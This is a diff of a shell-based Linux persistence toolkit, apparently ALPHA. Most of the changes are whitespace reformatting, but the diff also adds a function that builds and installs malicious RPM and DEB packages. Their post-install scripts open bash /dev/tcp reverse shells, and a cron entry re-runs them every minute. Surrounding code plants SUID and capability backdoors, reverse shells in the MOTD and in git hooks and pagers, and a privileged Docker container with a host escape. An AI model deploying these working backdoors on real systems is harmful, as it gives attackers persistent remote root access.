@@ -73,10 +73,11 @@ usage_root() {
 	echo "  --system-binary       Set up a system binary backdoor"
 	echo "  --udev                Cron job persistence"
 	echo "  --git                 Setup Git persistence"
-    echo "  --docker-container    Set up a malicious Docker container"
+	echo "  --docker-container    Set up a malicious Docker container"
+	echo "  --malicious-package   Set up a malicious package"
 	echo "  --revert		      Revert most changes made by ALPHA"
 	echo "  --quiet (-q) 		  Quiet mode (no banner)"
-    echo ""
+	echo ""
 }
 
 setup_systemd() {
@@ -131,10 +132,10 @@ setup_systemd() {
 				shift
 				port=$1
 				;;
-            --help|-h)
-                usage_systemd
-                exit 0
-                ;;
+			--help|-h)
+				usage_systemd
+				exit 0
+				;;
 			* )
 				echo "Invalid option for --systemd: $1"
 				echo "Try './alpha.sh --systemd --help' for more information."
@@ -342,10 +343,10 @@ setup_generator_persistence() {
 				shift
 				port=$1
 				;;
-            --help|-h)
-                usage_generator
-                exit 0
-                ;;
+			--help|-h)
+				usage_generator
+				exit 0
+				;;
 			* )
 				echo "Invalid option for --generator: $1"
 				echo "Try './alpha.sh --generator --help' for more information."
@@ -499,10 +500,10 @@ setup_cron() {
 				shift
 				name=$1
 				;;
-            --help|-h)
-                usage_cron
-                exit 0
-                ;;
+			--help|-h)
+				usage_cron
+				exit 0
+				;;
 			* )
 				echo "Invalid option: $1"
 				echo "Try './alpha.sh --cron --help' for more information."
@@ -593,10 +594,10 @@ setup_at() {
 				shift
 				time=$1
 				;;
-            --help|-h)
-                usage_at
-                exit 0
-                ;;
+			--help|-h)
+				usage_at
+				exit 0
+				;;
 			* )
 				echo "Invalid option for --at: $1"
 				echo "Try './alpha.sh --at --help' for more information."
@@ -679,10 +680,10 @@ setup_shell_profile() {
 				shift
 				port=$1
 				;;
-            --help|-h)
-                usage_shell_profile
-                exit 0
-                ;;
+			--help|-h)
+				usage_shell_profile
+				exit 0
+				;;
 			* )
 				echo "Invalid option for --shell-profile: $1"
 				echo "Try './alpha.sh --shell-profile --help' for more information."
@@ -773,10 +774,10 @@ setup_xdg() {
 				shift
 				port=$1
 				;;
-            --help|-h)
-                usage_xdg
-                exit 0
-                ;;
+			--help|-h)
+				usage_xdg
+				exit 0
+				;;
 			* )
 				echo "Invalid option for --xdg: $1"
 				echo "Try './alpha.sh --xdg --help' for more information."
@@ -876,10 +877,10 @@ setup_ssh_key() {
 				shift
 				target_user=$1
 				;;
-            --help|-h)
-                usage_ssh_key
-                exit 0
-                ;;
+			--help|-h)
+				usage_ssh_key
+				exit 0
+				;;
 			* )
 				echo "Invalid option for --ssh-key: $1"
 				echo "Try './alpha.sh --ssh-key --help' for more information."
@@ -986,10 +987,10 @@ setup_authorized_keys() {
 				shift
 				path=$1
 				;;
-            --help|-h)
-                usage_authorized_keys
-                exit 0
-                ;;
+			--help|-h)
+				usage_authorized_keys
+				exit 0
+				;;
 			* )
 				echo "Invalid option for --authorized-keys: $1"
 				echo "Try './alpha.sh --authorized-keys --help' for more information."
@@ -1061,10 +1062,10 @@ setup_new_user() {
 				shift
 				password=$1
 				;;
-            --help|-h)
-                usage_create_user
-                exit 0
-                ;;
+			--help|-h)
+				usage_create_user
+				exit 0
+				;;
 			* )
 				echo "Invalid option for --create-user: $1"
 				echo "Try './alpha.sh --create-user --help' for more information."
@@ -1227,10 +1228,10 @@ setup_passwd_user() {
 				shift
 				passwd_string=$1
 				;;
-            --help|-h)
-                usage_passwd_user
-                exit 0
-                ;;
+			--help|-h)
+				usage_passwd_user
+				exit 0
+				;;
 		
 			* )
 				echo "Invalid option for --passwd-user: $1"
@@ -1344,7 +1345,7 @@ setup_suid_backdoor() {
 		echo "Usage: ./alpha.sh --suid [OPTIONS]"
 		echo "--default                    Use default SUID settings"
 		echo "--custom                     Use custom SUID settings"
-		echo "  --binary <binary>            Specify the binary to give SUID permissions"
+		echo "  --binary <binary>           Specify the binary to give SUID permissions"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -1389,6 +1390,8 @@ setup_suid_backdoor() {
 		for bin in "${binaries[@]}"; do
 			if command -v $bin &> /dev/null; then
 				local path=$(command -v $bin)
+				# Resolve symbolic links to get the real path
+				path=$(realpath $path)
 				chmod u+s $path
 				if [[ $? -eq 0 ]]; then
 					echo "[+] SUID privilege granted to $path"
@@ -1408,6 +1411,8 @@ setup_suid_backdoor() {
 
 		if command -v $binary &> /dev/null; then
 			local path=$(command -v $binary)
+			# Resolve symbolic links to get the real path
+			path=$(realpath $path)
 			chmod u+s $path
 			if [[ $? -eq 0 ]]; then
 				echo "[+] SUID privilege granted to $path"
@@ -1499,7 +1504,7 @@ setup_motd_backdoor() {
 		fi
 
 		path="/etc/update-motd.d/137-python-upgrades"
-		echo -e "#!/bin/sh\nnohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" > $path
+		echo -e "#!/bin/sh\nnohup setsid bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' & disown" > $path
 		chmod +x $path
 		echo "[+] MOTD backdoor established in $path"
 
@@ -1757,9 +1762,9 @@ setup_initd_backdoor() {
 }
 
 setup_package_manager_persistence() {
-    local ip=""
-    local port=""
-    local mechanism=""
+	local ip=""
+	local port=""
+	local mechanism=""
 
 	if ! check_root; then
 		echo "Error: This function can only be run as root."
@@ -1773,30 +1778,30 @@ setup_package_manager_persistence() {
 		echo "  --apt | --yum | --dnf        Use APT, YUM or DNF package manager"
 	}
 
-    while [[ "$1" != "" ]]; do
-        case $1 in
-            --ip )
-                shift
-                ip="$1"
-                ;;
-            --port )
-                shift
-                port="$1"
-                ;;
-            --apt | --dnf | --yum )
-                mechanism="$1"
-                ;;
+	while [[ "$1" != "" ]]; do
+		case $1 in
+			--ip )
+				shift
+				ip="$1"
+				;;
+			--port )
+				shift
+				port="$1"
+				;;
+			--apt | --dnf | --yum )
+				mechanism="$1"
+				;;
 			--help|-h)
 				usage_package_manager_persistence
 				exit 0
 				;;
-            * )
-                echo "Invalid option: $1"
+			* )
+				echo "Invalid option: $1"
 				echo "Try './alpha.sh --package-manager --help' for more information."
-                exit 1
-        esac
-        shift
-    done
+				exit 1
+		esac
+		shift
+	done
 
 	if [[ -z $ip || -z $port || -z $mechanism ]]; then
 		echo "Error: --ip, --port, and one of --apt, --yum, or --dnf must be specified."
@@ -1949,8 +1954,8 @@ setup_cap_backdoor() {
 		echo "Usage: ./alpha.sh --cap [OPTIONS]"
 		echo "--default                    Use default capabilities settings"
 		echo "--custom                     Use custom capabilities settings"
-		echo "  --capability <capability>    Specify the capability"
-		echo "  --binary <binary>            Specify the path to the binary"
+		echo "  --capability <capability>   Specify the capability"
+		echo "  --binary <binary>           Specify the path to the binary"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -1994,10 +1999,12 @@ setup_cap_backdoor() {
 	fi
 
 	if [[ $default -eq 1 ]]; then
-		local binaries=("perl" "ruby", "php" "python" "python3", "node")
+		local binaries=("perl" "ruby" "php" "python" "python3" "node")
 		for bin in "${binaries[@]}"; do
 			if command -v $bin &> /dev/null; then
 				local path=$(command -v $bin)
+				# Resolve symbolic links to get the real path
+				path=$(realpath $path)
 				setcap cap_setuid+ep $path
 				if [[ $? -eq 0 ]]; then
 					echo "[+] Capability setuid granted to $path"
@@ -2017,6 +2024,8 @@ setup_cap_backdoor() {
 
 		if command -v $binary &> /dev/null; then
 			local path=$(command -v $binary)
+			# Resolve symbolic links to get the real path
+			path=$(realpath $path)
 			setcap $capability $path
 			if [[ $? -eq 0 ]]; then
 				echo "[+] Capability $capability granted to $path"
@@ -2059,10 +2068,10 @@ setup_bind_shell() {
 				shift
 				binary=$1
 				;;
-            --help|-h)
-                usage_bind_shell
-                exit 0
-                ;;
+			--help|-h)
+				usage_bind_shell
+				exit 0
+				;;
 			* )
 				echo "Invalid option for --bind-shell: $1"
 				echo "Try './alpha.sh --bind-shell --help' for more information."
@@ -2415,14 +2424,14 @@ setup_udev() {
 }
 
 setup_git_persistence() {
-    local default=0
-    local custom=0
-    local ip=""
-    local port=""
-    local hook=0
-    local pager=0
-    local path=""
-    local command=""
+	local default=0
+	local custom=0
+	local ip=""
+	local port=""
+	local hook=0
+	local pager=0
+	local path=""
+	local command=""
 
 	usage_git() {
 		echo "Usage: ./alpha.sh --git [OPTIONS]"
@@ -2438,168 +2447,168 @@ setup_git_persistence() {
 		echo "  --pager                      Establish Persistence through Git Pager"
 	}
 
-    while [[ "$1" != "" ]]; do
-        case $1 in
-            --default )
-                default=1
-                ;;
-            --custom )
-                custom=1
-                ;;
-            --ip )
-                shift
-                ip=$1
-                ;;
-            --port )
-                shift
-                port=$1
-                ;;
-            --hook )
-                hook=1
-                ;;
-            --pager )
-                pager=1
-                ;;
-            --path )
-                shift
-                path=$1
-                ;;
-            --command )
-                shift
-                command=$1
-                ;;
-            --help|-h)
-                usage_git
-                exit 0
-                ;;
-            * )
-                echo "Invalid option for --git: $1"
+	while [[ "$1" != "" ]]; do
+		case $1 in
+			--default )
+				default=1
+				;;
+			--custom )
+				custom=1
+				;;
+			--ip )
+				shift
+				ip=$1
+				;;
+			--port )
+				shift
+				port=$1
+				;;
+			--hook )
+				hook=1
+				;;
+			--pager )
+				pager=1
+				;;
+			--path )
+				shift
+				path=$1
+				;;
+			--command )
+				shift
+				command=$1
+				;;
+			--help|-h)
+				usage_git
+				exit 0
+				;;
+			* )
+				echo "Invalid option for --git: $1"
 				echo "Try './alpha.sh --git --help' for more information."
-                exit 1
-        esac
-        shift
-    done
+				exit 1
+		esac
+		shift
+	done
 
-    if [[ $default -eq 0 && $custom -eq 0 ]]; then
-        echo "Error: --default or --custom must be specified."
+	if [[ $default -eq 0 && $custom -eq 0 ]]; then
+		echo "Error: --default or --custom must be specified."
 		echo "Try './alpha.sh --git --help' for more information."
-        exit 1
-    fi
+		exit 1
+	fi
 
-    if [[ $default -eq 1 ]]; then
-        if [[ -z $ip || -z $port ]]; then
-            echo "Error: --ip and --port must be specified when using --default."
+	if [[ $default -eq 1 ]]; then
+		if [[ -z $ip || -z $port ]]; then
+			echo "Error: --ip and --port must be specified when using --default."
 			echo "Try './alpha.sh --git --help' for more information."
-            exit 1
-        fi
+			exit 1
+		fi
 
-        if [[ $hook -eq 0 && $pager -eq 0 ]]; then
-            echo "Error: Either --hook or --pager must be specified with --default."
+		if [[ $hook -eq 0 && $pager -eq 0 ]]; then
+			echo "Error: Either --hook or --pager must be specified with --default."
 			echo "Try './alpha.sh --git --help' for more information."
-            exit 1
-        fi
-    fi
+			exit 1
+		fi
+	fi
 
-    if [[ $custom -eq 1 ]]; then
-        if [[ -z $path || -z $command ]]; then
-            echo "Error: --path and --command must be specified when using --custom."
+	if [[ $custom -eq 1 ]]; then
+		if [[ -z $path || -z $command ]]; then
+			echo "Error: --path and --command must be specified when using --custom."
 			echo "Try './alpha.sh --git --help' for more information."
-            exit 1
-        fi
+			exit 1
+		fi
 
-        if [[ $hook -eq 0 && $pager -eq 0 ]]; then
-            echo "Error: Either --hook or --pager must be specified with --custom."
+		if [[ $hook -eq 0 && $pager -eq 0 ]]; then
+			echo "Error: Either --hook or --pager must be specified with --custom."
 			echo "Try './alpha.sh --git --help' for more information."
-            exit 1
-        fi
-    fi
+			exit 1
+		fi
+	fi
 
-    # Function to add malicious pre-commit hook
-    add_malicious_pre_commit() {
-        local git_repo="$1"
-        local pre_commit_file="$git_repo/.git/hooks/pre-commit"
+	# Function to add malicious pre-commit hook
+	add_malicious_pre_commit() {
+		local git_repo="$1"
+		local pre_commit_file="$git_repo/.git/hooks/pre-commit"
 
-        if [[ ! -f $pre_commit_file ]]; then
-            echo "#!/bin/bash" > $pre_commit_file
-            echo "(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &) &" >> $pre_commit_file
-            chmod +x $pre_commit_file
-            echo "[+] Created malicious pre-commit hook in $git_repo"
-        else
-            echo "[-] Pre-commit hook already exists in $git_repo"
-        fi
-    }
+		if [[ ! -f $pre_commit_file ]]; then
+			echo "#!/bin/bash" > $pre_commit_file
+			echo "(nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1' > /dev/null 2>&1 &) &" >> $pre_commit_file
+			chmod +x $pre_commit_file
+			echo "[+] Created malicious pre-commit hook in $git_repo"
+		else
+			echo "[-] Pre-commit hook already exists in $git_repo"
+		fi
+	}
 
-    # Function to add malicious pager configuration
-    add_malicious_pager() {
-        local git_repo="$1"
-        local git_config="$git_repo/.git/config"
-        local user_git_config="$HOME/.gitconfig"
+	# Function to add malicious pager configuration
+	add_malicious_pager() {
+		local git_repo="$1"
+		local git_config="$git_repo/.git/config"
+		local user_git_config="$HOME/.gitconfig"
 
-        local payload="nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' > /dev/null 2>&1 & \${PAGER:-less}"
+		local payload="nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' > /dev/null 2>&1 & \${PAGER:-less}"
 
-        if [[ ! -f $git_config ]]; then
-            mkdir -p $git_repo/.git
-            echo "[core]" > $git_config
-            echo "        pager = $payload" >> $git_config
-            echo "[+] Created Git config with malicious pager in $git_repo"
-        else
-            # Check if [core] section exists, add pager under it
-            if ! grep -q "\[core\]" $git_config; then
-                echo "[core]" >> $git_config
-            fi
-            # Add pager configuration under [core] section
-            sed -i '/^\[core\]/a \        pager = '"$payload"'' $git_config
-            echo "[+] Updated existing Git config with malicious pager in $git_repo"
-        fi
+		if [[ ! -f $git_config ]]; then
+			mkdir -p $git_repo/.git
+			echo "[core]" > $git_config
+			echo "        pager = $payload" >> $git_config
+			echo "[+] Created Git config with malicious pager in $git_repo"
+		else
+			# Check if [core] section exists, add pager under it
+			if ! grep -q "\[core\]" $git_config; then
+				echo "[core]" >> $git_config
+			fi
+			# Add pager configuration under [core] section
+			sed -i '/^\[core\]/a \        pager = '"$payload"'' $git_config
+			echo "[+] Updated existing Git config with malicious pager in $git_repo"
+		fi
 
-        # Add to user's global config if it doesn't exist
-        if [[ ! -f $user_git_config ]]; then
-            echo "[core]" > $user_git_config
-            echo "        pager = $payload" >> $user_git_config
-            echo "[+] Created global Git config with malicious pager"
-        else
-            # Check if [core] section exists, add pager under it
-            if ! grep -q "\[core\]" $user_git_config; then
-                echo "[core]" >> $user_git_config
-            fi
-            # Add pager configuration under [core] section in global config
-            sed -i '/^\[core\]/a \        pager = '"$payload"'' $user_git_config
-            echo "[+] Updated existing global Git config with malicious pager"
-        fi
-    }
+		# Add to user's global config if it doesn't exist
+		if [[ ! -f $user_git_config ]]; then
+			echo "[core]" > $user_git_config
+			echo "        pager = $payload" >> $user_git_config
+			echo "[+] Created global Git config with malicious pager"
+		else
+			# Check if [core] section exists, add pager under it
+			if ! grep -q "\[core\]" $user_git_config; then
+				echo "[core]" >> $user_git_config
+			fi
+			# Add pager configuration under [core] section in global config
+			sed -i '/^\[core\]/a \        pager = '"$payload"'' $user_git_config
+			echo "[+] Updated existing global Git config with malicious pager"
+		fi
+	}
 
-    # Function to add custom pre-commit hook
-    add_custom_pre_commit() {
-        if [[ ! -f $path ]]; then
-            echo "#!/bin/sh" > $path
-            echo "$command" >> $path
-            chmod +x $path
-            echo "[+] Created custom pre-commit hook in $path"
-        else
-            echo "[-] Pre-commit hook already exists in $path"
-        fi
-    }
+	# Function to add custom pre-commit hook
+	add_custom_pre_commit() {
+		if [[ ! -f $path ]]; then
+			echo "#!/bin/sh" > $path
+			echo "$command" >> $path
+			chmod +x $path
+			echo "[+] Created custom pre-commit hook in $path"
+		else
+			echo "[-] Pre-commit hook already exists in $path"
+		fi
+	}
 
-    # Function to add custom pager configuration
-    add_custom_pager() {
-        local payload="$command"
+	# Function to add custom pager configuration
+	add_custom_pager() {
+		local payload="$command"
 
-        if [[ ! -f $path ]]; then
-            echo "[core]" > $path
-            echo "        pager = $payload" >> $path
-            echo "[+] Created custom Git config with pager in $path"
-        else
-            # Check if [core] section exists, add pager under it
-            if ! grep -q "\[core\]" $path; then
-                echo "[core]" >> $path
-            fi
-            # Add pager configuration under [core] section
-            sed -i '/^\[core\]/a \        pager = '"$payload"'' $path
-            echo "[+] Updated existing Git config with custom pager in $path"
-        fi
-    }
+		if [[ ! -f $path ]]; then
+			echo "[core]" > $path
+			echo "        pager = $payload" >> $path
+			echo "[+] Created custom Git config with pager in $path"
+		else
+			# Check if [core] section exists, add pager under it
+			if ! grep -q "\[core\]" $path; then
+				echo "[core]" >> $path
+			fi
+			# Add pager configuration under [core] section
+			sed -i '/^\[core\]/a \        pager = '"$payload"'' $path
+			echo "[+] Updated existing Git config with custom pager in $path"
+		fi
+	}
 
-    # Function to find Git repositories and apply chosen options
+	# Function to find Git repositories and apply chosen options
 	find_git_repositories() {
 		local repos=$(find / -name ".git" -type d 2>/dev/null)
 
@@ -2618,26 +2627,26 @@ setup_git_persistence() {
 		fi
 	}
 
-    # Execute based on mode (default or custom)
-    if [[ $default -eq 1 ]]; then
-        find_git_repositories
-    elif [[ $custom -eq 1 ]]; then
-        if [[ $hook -eq 1 ]]; then
-            add_custom_pre_commit
-        elif [[ $pager -eq 1 ]]; then
-            add_custom_pager
-        fi
-    fi
+	# Execute based on mode (default or custom)
+	if [[ $default -eq 1 ]]; then
+		find_git_repositories
+	elif [[ $custom -eq 1 ]]; then
+		if [[ $hook -eq 1 ]]; then
+			add_custom_pre_commit
+		elif [[ $pager -eq 1 ]]; then
+			add_custom_pager
+		fi
+	fi
 }
 
 setup_malicious_docker_container() {
-    local ip=""
-    local port=""
+	local ip=""
+	local port=""
 
-    if ! check_root; then
-        echo "Error: This function can only be run as root."
-        exit 1
-    fi
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
 
 	usage_malicious_docker_container() {
 		echo "Usage: ./alpha.sh --docker-container [OPTIONS]"
@@ -2645,224 +2654,491 @@ setup_malicious_docker_container() {
 		echo "--port <port>                Specify port number"
 	}
 
-    while [[ "$1" != "" ]]; do
-        case $1 in
-            --ip )
-                shift
-                ip=$1
-                ;;
-            --port )
-                shift
-                port=$1
-                ;;
+	while [[ "$1" != "" ]]; do
+		case $1 in
+			--ip )
+				shift
+				ip=$1
+				;;
+			--port )
+				shift
+				port=$1
+				;;
 			--help|-h)
 				usage_malicious_docker_container
 				exit 0
 				;;
-            * )
-                echo "Invalid option for --docker-container: $1"
+			* )
+				echo "Invalid option for --docker-container: $1"
 				echo "Try './alpha.sh --docker-container --help' for more information."
-                exit 1
-        esac
-        shift
-    done
+				exit 1
+		esac
+		shift
+	done
 
-    if [[ -z $ip || -z $port ]]; then
-        echo "Error: --ip and --port must be specified."
+	if [[ -z $ip || -z $port ]]; then
+		echo "Error: --ip and --port must be specified."
 		echo "Try './alpha.sh --docker-container --help' for more information."
-        exit 1
-    fi
+		exit 1
+	fi
 
-    if ! docker ps &> /dev/null; then
-        echo "Error: Docker daemon is not running or permission denied."
-        exit 1
-    fi
+	if ! docker ps &> /dev/null; then
+		echo "Error: Docker daemon is not running or permission denied."
+		exit 1
+	fi
 
-    # Dockerfile setup and Docker image creation
-    DOCKERFILE="/tmp/Dockerfile"
-    cat <<-EOF > $DOCKERFILE
-    FROM alpine:latest
+	# Dockerfile setup and Docker image creation
+	DOCKERFILE="/tmp/Dockerfile"
+	cat <<-EOF > $DOCKERFILE
+	FROM alpine:latest
 
-    RUN apk add --no-cache bash socat sudo util-linux procps
+	RUN apk add --no-cache bash socat sudo util-linux procps
 
-    RUN adduser -D lowprivuser
+	RUN adduser -D lowprivuser
 
-    RUN echo '#!/bin/bash' > /usr/local/bin/entrypoint.sh \\
-        && echo 'while true; do /bin/bash -c "socat exec:\"/bin/bash\",pty,stderr,setsid,sigint,sane tcp:$ip:$port"; sleep 60; done' >> /usr/local/bin/entrypoint.sh \\
-        && chmod +x /usr/local/bin/entrypoint.sh
+	RUN echo '#!/bin/bash' > /usr/local/bin/entrypoint.sh \\
+		&& echo 'while true; do /bin/bash -c "socat exec:\"/bin/bash\",pty,stderr,setsid,sigint,sane tcp:$ip:$port"; sleep 60; done' >> /usr/local/bin/entrypoint.sh \\
+		&& chmod +x /usr/local/bin/entrypoint.sh
 
-    RUN echo '#!/bin/bash' > /usr/local/bin/escape.sh \\
-        && echo 'sudo nsenter -t 1 -m -u -i -n -p -- su -' >> /usr/local/bin/escape.sh \\
-        && chmod +x /usr/local/bin/escape.sh \\
-        && echo 'lowprivuser ALL=(ALL) NOPASSWD: /usr/bin/nsenter' >> /etc/sudoers
+	RUN echo '#!/bin/bash' > /usr/local/bin/escape.sh \\
+		&& echo 'sudo nsenter -t 1 -m -u -i -n -p -- su -' >> /usr/local/bin/escape.sh \\
+		&& chmod +x /usr/local/bin/escape.sh \\
+		&& echo 'lowprivuser ALL=(ALL) NOPASSWD: /usr/bin/nsenter' >> /etc/sudoers
 
-    USER lowprivuser
+	USER lowprivuser
 
-    ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]
+	ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]
 	EOF
 
-    # Building and running the Docker container
-    docker build -t malicious-container -f $DOCKERFILE . && \
-    docker run -d --name malicious-container --privileged --pid=host malicious-container
+	# Building and running the Docker container
+	docker build -t malicious-container -f $DOCKERFILE . && \
+	docker run -d --name malicious-container --privileged --pid=host malicious-container
 
-    echo "[+] Persistence through malicious Docker container complete."
+	echo "[+] Persistence through malicious Docker container complete."
 	echo "[+] To escape the container with root privileges, run '/usr/local/bin/escape.sh'."
 }
 
+#!/bin/bash
+
+setup_malicious_package() {
+	local ip=""
+	local port=""
+	local mechanism=""
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
+
+	usage_malicious_package() {
+		echo "Usage: ./setup.sh --malicious-package [OPTIONS]"
+		echo "  --ip <ip>             Specify IP address"
+		echo "  --port <port>         Specify port number"
+		echo "  --rpm                 Use RPM package manager"
+		echo "  --dpkg                Use DPKG package manager"
+	}
+
+	while [[ "$1" != "" ]]; do
+		case $1 in
+			--ip )
+				shift
+				ip="$1"
+				;;
+			--port )
+				shift
+				port="$1"
+				;;
+			--rpm )
+				mechanism="$1"
+				;;
+			--dpkg )
+				mechanism="$1"
+				;;
+			--help | -h )
+				usage_malicious_package
+				exit 0
+				;;
+			* )
+				echo "Invalid option: $1"
+				echo "Try './setup.sh --malicious-package --help' for more information."
+				exit 1
+		esac
+		shift
+	done
+
+	if [[ -z $ip || -z $port || -z $mechanism ]]; then
+		echo "Error: --ip, --port, and one of --rpm or --dpkg must be specified."
+		echo "Try './setup.sh --malicious-package --help' for more information."
+		exit 1
+	fi
+
+	case $mechanism in
+		--rpm )
+
+			if ! command -v rpm &> /dev/null; then
+				echo "Warning: RPM does not seem to be available. It might not work."
+				return 1
+			fi
+
+			if ! command -v rpmbuild &> /dev/null; then
+				echo "Error: rpmbuild is not installed."
+				exit 1
+			fi
+
+			# RPM package setup
+			PACKAGE_NAME="alpha"
+			PACKAGE_VERSION="1.0"
+			cat <<-EOF > ~/rpmbuild/SPECS/${PACKAGE_NAME}.spec
+			Name: ${PACKAGE_NAME}
+			Version: ${PACKAGE_VERSION}
+			Release: 1%{?dist}
+			Summary: RPM package with payload script
+			License: MIT
+
+			%description
+			RPM package with a payload script that executes a reverse shell.
+
+			%prep
+			# No need to perform any preparation actions
+
+			%install
+			# Create directories
+			mkdir -p %{buildroot}/usr/bin
+
+			%files
+			# No need to specify any files here since the payload is embedded
+
+			%post
+			# Trigger payload after installation
+			nohup setsid bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' &
+
+			%clean
+			rm -rf %{buildroot}
+
+			%changelog
+			* $(date +'%a %b %d %Y') John Doe <john.doe@example.com> 1.0-1
+			- Initial package creation
+			EOF
+			# Build RPM package
+			rpmbuild -bb ~/rpmbuild/SPECS/${PACKAGE_NAME}.spec
+
+			# Install RPM package with forced overwrite
+			rpm -i --force ~/rpmbuild/RPMS/x86_64/${PACKAGE_NAME}-1.0-1.el9.x86_64.rpm
+			mv ~/rpmbuild/RPMS/x86_64/${PACKAGE_NAME}-1.0-1.el9.x86_64.rpm /var/lib/rpm/${PACKAGE_NAME}.rpm
+			rm -rf /root/rpmbuild
+			# Add crontab entry for the current user
+			echo "*/1 * * * * rpm -i --force /var/lib/rpm/${PACKAGE_NAME}.rpm > /dev/null 2>&1" | crontab -
+			;;
+
+		--dpkg )
+
+			if ! command -v dpkg &> /dev/null; then
+				echo "Warning: DPKG does not seem to be available. It might not work."
+				return 1
+			fi
+
+			# DPKG package setup
+			PACKAGE_NAME="alpha"
+			PACKAGE_VERSION="1.0"
+			DEB_DIR="${PACKAGE_NAME}/DEBIAN"
+			PAYLOAD="#!/bin/sh\nnohup setsid bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' &"
+
+			# Create directory structure
+			mkdir -p ${DEB_DIR}
+
+			# Write postinst script
+			echo -e "${PAYLOAD}" > ${DEB_DIR}/postinst
+			chmod +x ${DEB_DIR}/postinst
+
+			# Write control file
+			echo "Package: ${PACKAGE_NAME}" > ${DEB_DIR}/control
+			echo "Version: ${PACKAGE_VERSION}" >> ${DEB_DIR}/control
+			echo "Architecture: all" >> ${DEB_DIR}/control
+			echo "Maintainer: https://github.com/Aegrah/ALPHA" >> ${DEB_DIR}/control
+			echo "Description: This malicious package was added through ALPHA" >> ${DEB_DIR}/control
+
+			# Build the .deb package
+			dpkg-deb --build ${PACKAGE_NAME}
+
+			# Install the .deb package
+			dpkg -i ${PACKAGE_NAME}.deb
+
+			rm -f ${PACKAGE_NAME}
+			rm -rf ${DEB_DIR}
+
+			# Add crontab entry for the current user
+			echo "*/1 * * * * /var/lib/dpkg/info/${PACKAGE_NAME}.postinst configure > /dev/null 2>&1" | crontab -
+			;;
+
+		* )
+			echo "Invalid mechanism specified."
+			exit 1
+			;;
+	esac
+}
+
 revert_changes() {
-    local current_user=$(whoami)
-    local ssh_dir="/home/$current_user/.ssh"
+	local current_user=$(whoami)
+	local ssh_dir="/home/$current_user/.ssh"
+	local is_root=false
+	local in_docker_group=false
+	local malicious_entry="/dev/tcp"
 
-    # Systemd
-    echo "[*] Cleaning Systemd persistence methods..."
-    systemctl stop dbus-org.freedesktop.resolved.service dbus-org.freedesktop.resolved.timer 2>/dev/null
-    systemctl disable dbus-org.freedesktop.resolved.service dbus-org.freedesktop.resolved.timer 2>/dev/null
-    rm -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.service
-    rm -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer
-    rm -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.service
-    rm -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.timer
-    echo "[+] Successfully cleaned persistence method Systemd"
+	# Check if running as root
+	if [ "$(id -u)" -eq 0 ]; then
+		is_root=true
+	fi
 
-    # Systemd Generator
-    echo "[*] Cleaning Systemd Generator persistence methods..."
-    systemctl stop generator.service 2>/dev/null
-    systemctl disable generator.service 2>/dev/null
-    rm -f /usr/lib/systemd/system-generators/makecon
-    rm -f /usr/lib/systemd/system-generators/generator
-    rm -f /run/systemd/system/generator.service
-    rm -f /run/systemd/system/multi-user.target.wants/generator.service
-    echo "[+] Successfully cleaned persistence method Systemd Generator"
+	# Check if the user is in the docker group
+	if groups $current_user | grep -q '\bdocker\b'; then
+		in_docker_group=true
+	fi
 
-    # Cron
-    echo "[*] Cleaning Cron persistence methods..."
-    rm -f /etc/cron.d/freedesktop_timesync1
-    for file in /etc/cron*; do
-        [ -e "$file" ] && sed -i "/\/dev\/tcp/ d" $file 2>/dev/null
-    done
-    crontab -l | grep -v "/dev/tcp" | grep -v "-i" | crontab -
-    echo "[+] Successfully cleaned persistence method Cron"
+	if $is_root; then
+		echo "[*] Running as root..."
+	else
+		echo "[*] Running as user..."
+	fi
 
-    # At
-    echo "[*] Cleaning At persistence methods..."
-    for file in /var/spool/cron/atjobs/*; do
-        [ -e "$file" ] && sed -i "/\/dev\/tcp/ d" $file 2>/dev/null
-    done
-    echo "[+] Successfully cleaned persistence method At"
+	# Systemd
+	echo "[*] Cleaning Systemd persistence methods..."
+	if $is_root; then
+		systemctl stop dbus-org.freedesktop.resolved.service dbus-org.freedesktop.resolved.timer 2>/dev/null
+		systemctl disable dbus-org.freedesktop.resolved.service dbus-org.freedesktop.resolved.timer 2>/dev/null
+		rm -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.service
+		rm -f /usr/local/lib/systemd/system/dbus-org.freedesktop.resolved.timer
+	fi
+	rm -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.service
+	rm -f /home/$current_user/.config/systemd/user/dbus-org.freedesktop.resolved.timer
+	if ! $is_root; then
+		systemctl --user stop dbus-org.freedesktop.resolved.service dbus-org.freedesktop.resolved.timer 2>/dev/null
+		systemctl --user disable dbus-org.freedesktop.resolved.service dbus-org.freedesktop.resolved.timer 2>/dev/null
+	fi
+	echo "[+] Successfully cleaned persistence method Systemd"
 
-    # Shell profile
-    echo "[*] Cleaning Shell profile persistence methods..."
-    [ -e "/etc/profile" ] && sed -i "/\/dev\/tcp/ d" /etc/profile 2>/dev/null
-    [ -e "/home/$current_user/.bash_profile" ] && sed -i "/\/dev\/tcp/ d" /home/$current_user/.bash_profile 2>/dev/null
-    echo "[+] Successfully cleaned persistence method Shell profile"
+	# Systemd Generator
+	echo "[*] Cleaning Systemd Generator persistence methods..."
+	if $is_root; then
+		systemctl stop generator.service 2>/dev/null
+		systemctl disable generator.service 2>/dev/null
+		rm -f /usr/lib/systemd/system-generators/makecon
+		rm -f /usr/lib/systemd/system-generators/generator
+		rm -f /run/systemd/system/generator.service
+		rm -f /run/systemd/system/multi-user.target.wants/generator.service
